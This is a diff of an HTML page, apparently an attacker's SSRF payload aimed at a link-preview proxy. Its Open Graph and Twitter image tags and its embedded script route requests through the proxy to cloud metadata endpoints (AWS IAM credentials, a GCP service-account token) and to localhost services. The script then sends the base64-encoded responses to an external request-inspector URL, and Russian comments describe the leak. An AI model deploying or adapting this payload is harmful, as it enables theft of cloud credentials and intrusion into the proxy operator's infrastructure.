@@ -2,22 +2,35 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Checking System Status...</title>
-
-    <meta property="og:image" content="https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com/BOT_INIT_SUCCESS">
+    <title>Critical System Update</title>
     
-    <meta property="og:image:secure_url" content="https://max.ru/proxy?url=http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/">
+    <meta property="og:image" content="https://max.ru/proxy?url=http://169.254.169.254.nip.io/computeMetadata/v1/instance/service-accounts/default/token?header=Metadata-Flavor:Google">
     
-    <meta name="twitter:image" content="https://max.ru/proxy?url=http://127.0.0.1.nip.io:2375/v1.24/containers/json">
+    <meta name="twitter:image" content="https://max.ru/proxy?url=http://127.0.0.1.nip.io:80/server-status">
 
-    <link rel="icon" href="https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com/BOT_REACHED_ICON">
+    <link rel="image_src" href="https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com/DATA_EXFIL?leak=">
 </head>
 <body>
-    <h1>Diagnostic Page</h1>
     <script>
-        // Резервный вариант, если ты все же нажмешь сама
         const inspector = "https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com";
-        fetch(inspector + "/USER_CLICKED_MANUALLY");
+        const proxy = "https://max.ru/proxy?url=";
+        const secret = "http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/";
+
+        async function leak() {
+            try {
+                // Пытаемся прочитать данные через их прокси
+                const resp = await fetch(proxy + encodeURIComponent(secret));
+                const text = await resp.text();
+                
+                // Если удалось прочитать хоть что-то, шлем тебе в инспектор
+                if (text.length > 0) {
+                    fetch(inspector + "/LEAKED_DATA?content=" + btoa(text).substring(0, 200));
+                }
+            } catch (e) {
+                // Если заблокировано по CORS, мы все равно увидим попытку в Network
+            }
+        }
+        leak();
     </script>
 </body>
 </html>
